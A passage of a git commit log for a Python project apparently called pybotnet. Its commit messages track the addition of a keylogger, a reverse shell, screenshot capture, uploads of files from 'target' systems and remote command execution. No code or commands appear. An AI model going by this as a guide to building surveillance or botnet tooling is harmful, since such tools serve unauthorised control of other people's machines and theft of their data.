+Date:   Mon Sep 20 18:24:12 2021 +0430
+
+    fixed requirements.txt file
+
+commit 71ab64bae9486e6d507eb9735821592e47f06aca
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Sun Sep 19 19:56:04 2021 +0430
+
+    Added keyloger.
+
+commit 4ecb06c6e0a9a0aabdbd8840ba117a9fb9b46a09
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Sun Sep 19 16:23:55 2021 +0430
+
+    Added keylogger function to scripts , fixed a few bugs , code will be tested now.
+
+commit df059cbfd6b73c0bc0198a263eff629189aec837
+Author: SepehrRasouli <alirezarasooli1347@gmail.com>
+Date:   Sun Sep 19 15:27:12 2021 +0430
+
+    added keylogger
+
+commit 2cab4dbd9f767dfe4f8575b60bb2df0c81cee940
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 22:27:12 2021 +0430
+
+    add a space!
+
+commit 29acff758474105b04714216cd453de616b4b21b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 22:18:57 2021 +0430
+
+    remove bad import
+
+commit 3c1a0b6764c4f53f2b4b3fc5ea72e07f7e941387
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 22:18:36 2021 +0430
+
+    up to 0.20.8
+
+commit 6ba1297c45600ba43e1cd6ac618efcf77471abf9
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Sep 18 22:05:37 2021 +0430
+
+    add version badge
+
+commit d1282e0163742e087886bca31a6911df3a933828
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Sep 18 21:57:42 2021 +0430
+
+    edit badges
+
+commit 7e7112de6b4ad132629f223dc2d8baa60de5adde
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 19:46:05 2021 +0430
+
+    add to help: run reverse_shell by mac addres
+
+commit fd4c70ad1e18562da6c939419efcf33354457d57
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Sep 18 19:38:45 2021 +0430
+
+    add Contributors
+
+commit e54ba5115a49a0abd63dafce0cc7212141dcd977
+Merge: b5eac4b 9085fc3
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Sep 18 19:14:14 2021 +0430
+
+    Merge pull request #7 from SepehrRasouli/master
+    
+    test reverse_shell on windows and add it to README.md file
+
+commit 9085fc3dff7b22b6ee514e9cb1e984dfada68df3
+Author: SepehrRasouli <81516241+SepehrRasouli@users.noreply.github.com>
+Date:   Sat Sep 18 17:38:57 2021 +0430
+
+    Update README.md
+
+commit b5eac4b7abf966397df23d0fdfc6cfe9782eef1b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:34:06 2021 +0430
+
+    upgrade 0.20.7
+
+commit 5ccf4acab74a13fe1b2bfcaff05a5c86124b2587
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:33:26 2021 +0430
+
+    move reverse shell to top, tanx yo TorhamDev
+
+commit 43b3d605c0f23640bcd7d2391abc9912c0d1d32b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:31:23 2021 +0430
+
+    edit scripts_name
+
+commit 637acf7498dacd7818cd985aa642d0b43b9fe01b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:26:27 2021 +0430
+
+    rename reverse_shell to reverse shell
+
+commit ee54a9c68534d571b594897e06628336c428ae8e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:24:12 2021 +0430
+
+    upgrade to 0.20.6
+
+commit a43fa8ad56d5fe7cd1c3f7541d3a6475e111fb9f
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:22:13 2021 +0430
+
+    add reverse_shell to Features
+
+commit 0a42d9c8e43dc96c4335d8afe04be127c0e910fc
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:03:11 2021 +0430
+
+    upgrade to  0.20.5
+
+commit b10c04fec3245a81316c6c559c5e64b94eabae44
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 15:02:41 2021 +0430
+
+    debug subprocess in cmd founction
+
+commit 78693b3f0fe9a86454e9261eb95179e92cd26f0c
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 14:42:27 2021 +0430
+
+    move send_message to reverse_shell and debug if command_name == MAC_ADDRES:
+
+commit 3a3e9c00759339be2a2e002cac4f98c4509c82f1
+Merge: c029cdf 826574f
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 14:30:54 2021 +0430
+
+    Merge branch 'TorhamDev-master'
+    change some code for For better performance
+    tanx to TorhamDev for this nice feature
+
+commit 826574fd1954ac08fcac7cadfd1165b86f4537ad
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 14:30:19 2021 +0430
+
+    clean some method, for TRY
+
+commit 2b38bc5f21aea07c3ad61d1c79c669a74a5e498e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 14:29:54 2021 +0430
+
+    change reverse_shell, for TRY
+
+commit eb30511eec887cb57c9d9f53600bf7fa9098ca9b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 14:28:55 2021 +0430
+
+    pybotnet_version = '0.20.1'
+
+commit 9992d81f627e123ea6cc20e50cbc5e70a93d368c
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 14:26:57 2021 +0430
+
+    add new feature: reverse_shell, tanx to TorhamDev
+
+commit bb0fec1180bbcdeadeaca11faa514acdd84c0e92
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Sep 18 14:26:01 2021 +0430
+
+    add send_message_by_third_party_proxy and get_last_admin_command_by_third_party_proxy
+
+commit c08f33a3319feb93db6fd551309f0a6dc73eed25
+Author: TorhamDEV <torhamdev@gmail.com>
+Date:   Sat Sep 18 10:15:01 2021 +0430
+
+    add reverse shell features
+
+commit c029cdf8985e07a3d5ec55168c0bc73040f64a32
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 18:49:03 2021 +0430
+
+    add cpu count to get_full_system_info
+
+commit ec90ccd807b11698762f584e72c297b1b65183dd
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 18:48:37 2021 +0430
+
+    upgrade to 0.19.5
+
+commit 4e7bb43477f5e158dad3884aa39913e7772319f2
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 18:48:12 2021 +0430
+
+    add cd command and fix cmd command
+
+commit a391288693c071a397576476b7c8888dbcc02479
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 18:47:25 2021 +0430
+
+    change som var and execute_cmd
+
+commit 3551d09467265db5688d8f938aef0c0af7d591e3
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 18:46:37 2021 +0430
+
+    add *.png by:  TorhamDev
+
+commit 2b7a89cfb3e878790ae3133107bddc53ce2d1bf0
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 18:45:43 2021 +0430
+
+    add new command
+
+commit f716169b02320c9cebd574b37b7d62b3e871daca
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 17:03:54 2021 +0430
+
+    change last to previous
+
+commit 2e358c00a2b0aad9da1555f60da6cf6af882cd72
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 16:59:53 2021 +0430
+
+    add previous_update_id: just pass if command has already been executed
+
+commit 27485143e7e098582a14123db880a022f9e49f9c
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 16:23:21 2021 +0430
+
+    Delete a function that is not used
+
+commit f13a9c43e72b013c856cbd96772bc3bd3b5e943a
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 16:19:23 2021 +0430
+
+    remove command .. change mac_addres to MAC_ADDRES
+
+commit e834834972429d58389ba1391311559557284cf4
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Sep 17 16:12:42 2021 +0430
+
+    fix execute_ls ..
+
+commit 5ef615c4711ce4ca094f71c66b76813c8e1945e6
+Merge: f039c64 e775730
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Sep 17 16:00:27 2021 +0430
+
+    Merge pull request #5 from onionj/revert-4-master
+    
+    Revert "Change the wrong logic of the program."
+
+commit e7757309dade37bc0a7f406b13723b1356bef6ee
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Sep 17 15:59:21 2021 +0430
+
+    Revert "Change the wrong logic of the program."
+
+commit f039c64fc673d4697d56be24d6760086bf86d12b
+Merge: 2e365b3 081eaca
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Sep 17 14:08:11 2021 +0430
+
+    Merge pull request #4 from TorhamDev/master
+    
+    Change the wrong logic of the program.
+
+commit 081eacafe9cbed8ad55231813cce8cad6bf6eb7e
+Author: TorhamDEV <torhamdev@gmail.com>
+Date:   Fri Sep 17 13:08:34 2021 +0430
+
+    Add query and change wrong logic
+
+commit 71471eb0d78a5825525ba9144241d6233b7440a5
+Author: TorhamDEV <torhamdev@gmail.com>
+Date:   Fri Sep 17 13:07:36 2021 +0430
+
+    This file is no longer needed
+
+commit a0046a5aafb2d4ea4ffc50246ab943cb510335a5
+Author: TorhamDEV <torhamdev@gmail.com>
+Date:   Fri Sep 17 13:07:07 2021 +0430
+
+    Change the code. Add get_runtime_command and change some comments
+
+commit 2140b62a35faf3789c77b8028ddec3675077dcda
+Author: TorhamDEV <torhamdev@gmail.com>
+Date:   Fri Sep 17 13:04:31 2021 +0430
+
+    This file is no longer needed
+
+commit 2ae07df4583619526df484aecb4d1a3ef03d2bf6
+Author: TorhamDEV <torhamdev@gmail.com>
+Date:   Fri Sep 17 13:03:23 2021 +0430
+
+    modify .gitignore and add *.png
+
+commit 2e365b3845ff07c44eb7d60172b3134b95daf5cd
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Aug 27 16:10:15 2021 +0430
+
+    up to 0.18.9
+
+commit d22641045a4b731e8e0b79d3c13bd264885d2aeb
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Aug 26 14:40:51 2021 +0430
+
+    change system info text
+
+commit e516d8ecb7fc138e97a1645d66050aeede195b1d
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Aug 19 15:10:03 2021 +0430
+
+    PEP8
+
+commit 8ac106d6053f1140659d433bac1d95530bc2a155
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Aug 10 01:18:19 2021 +0430
+
+    Update README.md
+
+commit 1bfb07560db969b00cd58935d4c81f5aa60f31b1
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Aug 8 21:56:00 2021 +0430
+
+    change from GPL to LGPL
+
+commit 405a5ca2fd9d1eb0abf0f0082eae8b33c54eb847
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Aug 8 21:54:00 2021 +0430
+
+    move some note
+
+commit ae46f4fd0b9ecc649ef72350f190293aca9d17f7
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 27 13:28:01 2021 +0430
+
+    add more comment
+
+commit 70f5664fe69d49545e04409cd17224fecb6ac2eb
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jul 29 01:26:04 2021 +0430
+
+    Update README.md
+
+commit 099bcca26b70d81f347dca6f73e97980d492e9d1
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jul 29 01:16:21 2021 +0430
+
+    Update README.md
+
+commit 93211bcde4b9abe4b8eaf35193f43dfb7f91038b
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 27 13:14:32 2021 +0430
+
+    edit version
+
+commit 3d786e28c5477c98d4828addac77b4fbd71b9f62
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 27 13:10:19 2021 +0430
+
+    add better help
+
+commit 259d6db288723f8020552634bc1f530e49e7a8c0
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 24 08:23:37 2021 -0700
+
+    add vinet link
+
+commit 44f4593569d58e032e4968176362f5935dc369f1
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 24 18:45:35 2021 +0430
+
+    debug cmd command on is_shell==False
+
+commit f4812469f45f1ee7153ff57fc872701e1ce94b5b
+Merge: 6bc1f4f c19d699
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 24 16:10:37 2021 +0430
+
+    Merge branch 'master' of https://github.com/onionj/pybotnet
+
+commit 6bc1f4f1321ce3e61f392677bd74010ae9eb4320
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 24 16:07:26 2021 +0430
+
+    ___
+
+commit c19d6996da489e829bfdee619445258efebbf571
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jul 23 07:03:09 2021 -0700
+
+    Update README.md
+
+commit 900229231f092690bfa2c942019e7580f1123a1a
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 19:53:14 2021 +0430
+
+    change table
+
+commit 15286c88adfb025225d658a2deb1513ba523c8a2
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 19:44:25 2021 +0430
+
+    add hlp command , v0.18.5
+
+commit bc523132893ad2201dfc7a95b3a8d4bea0458bfe
+Merge: a0fafc8 68d5f7d
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jul 22 17:13:04 2021 +0430
+
+    Merge pull request #2 from onionj/develop
+    
+    Develop screenshot
+
+commit 68d5f7d3ef9577a773152b7fd605cc56006815ec
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 12:33:06 2021 +0430
+
+    test and debug export_file and screenshot on windows
+
+commit 7b8f4dce3cb7734cfb2c802d7e5b988e8f1433ff
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 16:05:50 2021 +0430
+
+    move note
+
+commit 50b8dd57139040288fe6cca00d77ba5550bd95ac
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 16:03:52 2021 +0430
+
+    edit Disclaimer
+
+commit 8cb33aa5f1142a3b203a17d24ae5744d8751322f
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 16:03:01 2021 +0430
+
+    edit Disclaimer
+
+commit 765a67e4b6085424e117043a5a2741daa3cb5b4d
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 16:01:38 2021 +0430
+
+    add screenshot and Disclaimer
+
+commit b144f73d0a4fe44efd3ac4d0b8572e902f74f41b
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 15:53:59 2021 +0430
+
+    reed and dependencies as requirements.txt file
+
+commit da083ff8ed2581d7f8513b4af1b1b6b0ba508fcb
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 22 15:53:10 2021 +0430
+
+    add screenshot methods
+
+commit a0fafc865a64065303bdd7119065144264dd7b6c
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jul 21 00:12:03 2021 +0430
+
+    fix licence
+
+commit 0ee462894542bbd233ae69124b5eab5dd4bf25ea
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jul 21 00:00:30 2021 +0430
+
+    fix licence
+
+commit ef66b2012539bee5b68fc48774a16d4946ea8b1c
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 16 18:24:16 2021 +0430
+
+    add file_type file_type
+
+commit 64818841f749118a2cd0173f8c633db5f79f354a
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 16 18:23:46 2021 +0430
+
+    remove pyautogui
+
+commit 18b3ef7325af679dd7ae3d46a640e4041885b85a
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 16 18:01:09 2021 +0430
+
+    add pyautogui to REQUIRED pakages
+
+commit cb594d85e10ed5e5e53e54c069bc920e9d5ee596
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jul 16 11:06:50 2021 +0430
+
+    Update README.md
+
+commit 5b13c1b3ed0ea49af6729056e5f12529ca86e18b
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jul 16 11:05:58 2021 +0430
+
+    Update README.md
+
+commit 71a3106a6756bceb8e4e8c1dc819612929f7cccf
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jul 16 11:04:56 2021 +0430
+
+    Update README.md
+
+commit 6b4b8779ddd55ee04d81f7eef738d7cc7954513a
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 15 23:31:05 2021 +0430
+
+    edit table
+
+commit 563a9ed8513d3c03f13609715f304cf77557fcbb
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 15 14:54:26 2021 +0430
+
+    edit command table
+
+commit 5a4493d39224a20de15bd59a5b1ea74473c72924
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 15 14:52:51 2021 +0430
+
+    add script for upload file and add import file from target script
+
+commit 11e10d3c58ef80c546a4a7600597f3d59bb25948
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 15 13:35:38 2021 +0430
+
+    remove bugy and dead code
+
+commit d593070472caee87fa67708079fac58731037f42
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 15 13:34:31 2021 +0430
+
+    remove test.txt
+
+commit b5a620ae7835f9e80e347af7b557558268de09d3
+Author: onionj <onionj98@gmail.com>
+Date:   Thu Jul 15 13:33:10 2021 +0430
+
+    add upload server 1 for input file from target system
+
+commit a4e73169fbf913d491bce22b0d0a8a060a9ac765
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jul 14 01:14:02 2021 +0430
+
+    new TODO please see this
+
+commit 4e14bbeeea55bcef4ba641f102c2a3349bf0fd53
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jul 14 01:00:33 2021 +0430
+
+    add option for delete source ile after ziped
+
+commit f9c98eb90549a84f18d39a89c17fd2abcc08402c
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 13 23:41:46 2021 +0430
+
+    fix some bug and better code
+
+commit 3886875fb827f8fc19b8e190aed7f2b3f5e5f59d
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 13 23:29:34 2021 +0430
+
+    debug
+
+commit bc0602d073ce7621073832a248cea8b515652ddb
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 13 23:28:45 2021 +0430
+
+    add new function
+
+commit 0743f299bdec8a895fa80f13142c2f2ad64bb08e
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jul 13 23:22:11 2021 +0430
+
+    change
+
+commit e8f83205bdff390096cbcc81e5f251ee83d8f55f
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jul 11 23:20:42 2021 +0430
+
+    update 0.15.9
+
+commit a8b6c0b0d17a977c0447e269917deb3b03517a90
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jul 11 22:39:16 2021 +0430
+
+    make better print in sample :)
+
+commit 3582f9bb6cba3d7c7829333e0babbb67db13e4f1
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jul 11 22:33:37 2021 +0430
+
+    test export_file on linux
+
+commit 00125fa7ecf9204385ba978b3c99853db49e77c7
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sun Jul 11 05:14:56 2021 -0700
+
+    Update TODOLIST.MD
+
+commit 27b895b2f23f2debe6169cc4c764b6fb4e6be046
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sun Jul 11 05:09:42 2021 -0700
+
+    Update TODOLIST.MD
+
+commit 89e75dc041734aeea80f56933f095728c8d9f0f7
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jul 9 04:10:36 2021 -0700
+
+    Update TODOLIST.MD
+
+commit 16e51f5ffc3a9ea8c5785afdb30992090fcd79cc
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jul 8 15:17:05 2021 -0700
+
+    Update TODOLIST.MD
+
+commit a8c3422312d7f3bc5c84459b3a9c7134fcf57fcf
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jul 7 17:30:33 2021 +0430
+
+    add autopep8 in develop requirements
+
+commit 17fcff0669775786fcb09328936bd732414fbbb4
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jul 7 17:29:56 2021 +0430
+
+    clean code in download_manager
+
+commit 346a7a80e343bcd91b9f3e694dd3d9f1b9bd7a55
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jul 5 21:56:26 2021 +0430
+
+    update to 0.15.8
+
+commit 5087dce10ab4c59b1ca340cd7e47c6f9ced07f3b
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jul 5 21:55:57 2021 +0430
+
+    update to 0.15.7
+
+commit b6b98a0312607f2b375ff0ea7e238a0d83227d0e
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 15:23:27 2021 -0700
+
+    Update README.md
+
+commit 2e2e2169310215bfd4291d98053dd001c9279788
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jul 4 02:44:14 2021 +0430
+
+    add pypi link
+
+commit 8ba39927bc37cb35cbe5777fe7ce8f03a9f51443
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jul 4 02:18:59 2021 +0430
+
+    add comment
+
+commit 708117808c29045c16d451c1de4773345b32ee91
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jul 4 02:16:51 2021 +0430
+
+    make some comment
+
+commit 3987dc5ede1495f65c8bf070c70dc99a4226360f
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 14:40:50 2021 -0700
+
+    Update README.md
+
+commit 1282f0be447a796d9987ba14a639ba4da7a06f42
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 14:36:55 2021 -0700
+
+    Update README.md
+
+commit 8a4cb5d535806619051de015c5f56c20ad9044b6
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 14:34:45 2021 -0700
+
+    Update README.md
+
+commit f96c5fd8c6161be204e87a3cf8eea3f5c04f5db2
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 14:24:09 2021 -0700
+
+    Update README.md
+
+commit 2c523d921422c850b858b89569473d88b8e0f14b
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 14:23:24 2021 -0700
+
+    Update README.md
+
+commit 3ed66df270562cf6a0c661567df03324b93e55c5
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 13:53:47 2021 -0700
+
+    Update README.md
+
+commit 00f8645b078494fa2e3589d7f4fadda5748baca6
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 23:15:43 2021 +0430
+
+    remove
+
+commit 084c2866f44745370a5e9cb0b1a00e7790405f94
+Merge: d2074c7 31f3779
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 23:15:03 2021 +0430
+
+    Merge branch 'master' of https://github.com/onionj/pybotnet
+
+commit d2074c75e52e5936c6159c03cfed635eb570fefd
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 23:14:24 2021 +0430
+
+    update to 0.15.5
+
+commit 31f377934b370ed5e9dd81ebaa4a74d6e985a531
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 11:43:48 2021 -0700
+
+    Update README.md
+
+commit 0b302df4ca7f691ef71756eab74ed6e617f94e32
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 22:41:31 2021 +0430
+
+    new version
+
+commit a3581b3a7da6f6b32037c42389b40ae345a5f777
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 22:40:38 2021 +0430
+
+    edit banner link
+
+commit 45d42a6309afd85022a220ddc36d078fe381b141
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 22:39:53 2021 +0430
+
+    add banner
+
+commit f6a85d340f38db3c368b3894dec1a138467a9ba5
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 11:07:31 2021 -0700
+
+    Update README.md
+
+commit aa78a14bd2551f83070663f85c41292c61712cdf
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 22:24:01 2021 +0430
+
+    add icon
+
+commit a495ab00a1144ea00ea511aef39ccde8beb525ae
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 10:50:10 2021 -0700
+
+    Update README.md
+
+commit 8a83b64aa5a30438a2bffcdb3559b650b60fcf65
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 10:49:27 2021 -0700
+
+    Update README.md
+
+commit f6f9c31d86781802090567849b2706b29993c9c0
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 22:15:38 2021 +0430
+
+    add comment : setup ad twine command
+
+commit 5af379b7a9f5f701f0ca46151256185ed7de1310
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 22:12:42 2021 +0430
+
+    update to new version
+
+commit efbe065a0411dd5a1263476036baee13e10f78ea
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jul 3 10:36:19 2021 -0700
+
+    Update README.md
+
+commit b4c1d31dd9fc3c22f07191e187ebe27efa090ba5
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:59:22 2021 +0430
+
+    remove some link
+
+commit bbbe3517b1be878a3ff9badf326787768e90a688
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:57:38 2021 +0430
+
+    add project to pypi.org .. add pip install pybotnet
+
+commit db5d7698e7a4368fa882a602ce9bb47d626ddd06
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:46:32 2021 +0430
+
+    change required pakage name
+
+commit 538453d97122516da76d37610e2abd3cd1fa35ad
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:33:39 2021 +0430
+
+    edit find_pakages in line 96
+
+commit 60a4abadc1666986b212e218683873e8e3100d1d
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:32:29 2021 +0430
+
+    edit imports
+
+commit f90b64079010fbd07ec64e9d862217024cd88b14
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:23:11 2021 +0430
+
+    remove some comment
+
+commit b5a961ec0fb428cf4290e72bf2a7fcd3086faab5
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:22:56 2021 +0430
+
+    change bs4 beautifulsoup4
+
+commit c3a0d68600c1412e7d4d0d76fc0b1c7cfc40dfcb
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:18:59 2021 +0430
+
+    add new keywords
+
+commit c755cf7f23170d9af77209eced55a3f41a52ee68
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 21:04:08 2021 +0430
+
+    add for pypi
+
+commit bc9d6d968f9f2b45041fa788db5fac5f1cee8d94
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 20:55:39 2021 +0430
+
+    make setup for pypi
+
+commit 5a1c94598b84c2a9ce94397544c1e772a6e03447
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 20:55:22 2021 +0430
+
+    remove verion in this file
+
+commit 8d50c6ed11c0478292c6c947ff795ffd5cddff00
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 20:54:36 2021 +0430
+
+    add twine
+
+commit dc50351fee97a8baf36ee3662937b3633cd14c83
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 20:12:50 2021 +0430
+
+    channge download url
+
+commit fd57eaab7da6205c9bc45b60b65380f0ecbad22e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 20:09:37 2021 +0430
+
+    new version v0.15.1
+
+commit fe1f331637282f812724eceff9420eefb8e7a745
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 20:06:21 2021 +0430
+
+    try to fix pypi files
+
+commit 03843c3d85ad78d962495a6f30a77caacf22f0a5
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 19:36:53 2021 +0430
+
+    remove temp file
+
+commit 71c6ad1f8f435639918fed9c62b396bd01d9abd2
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 19:32:09 2021 +0430
+
+    up to v0.15
+
+commit 8612bc8a67aa8a6f6d929ba356dce91fa0246ae9
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 19:30:55 2021 +0430
+
+    add setup for pypi
+
+commit e250d9c95033cc8102f6c4bf3523bf58df0bad05
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 19:27:46 2021 +0430
+
+    update download link
+
+commit bbb2af7cc7c7c6e51975166abbca3b782013bb85
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 15:54:23 2021 +0430
+
+    add LICENSE to pybotnet.pybotnet folder
+
+commit 7baa164b4f7fcc07d145757341a9c79a378f4314
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 15:54:00 2021 +0430
+
+    import .pybotnet.PYBotNet
+
+commit 67b9b395ca1c1351c2f9ed59b470856aaf49aa0d
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 15:53:34 2021 +0430
+
+    add new TODO
+
+commit 6492742d0bcb8abf52d5eff46f1dc9ebf5e5ee2b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 15:53:18 2021 +0430
+
+    V 0.15
+
+commit 04e251259a32026df7b0316653477d6c176a5370
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 15:37:22 2021 +0430
+
+    edit get_last_update_id doc string
+
+commit aefbf0dba503bd95c43775314416c60ed008e86e
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 15:36:50 2021 +0430
+
+    remove a print()
+
+commit cfa756179ea1a728b7a2482739378d335ce0ca5c
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jul 3 14:41:24 2021 +0430
+
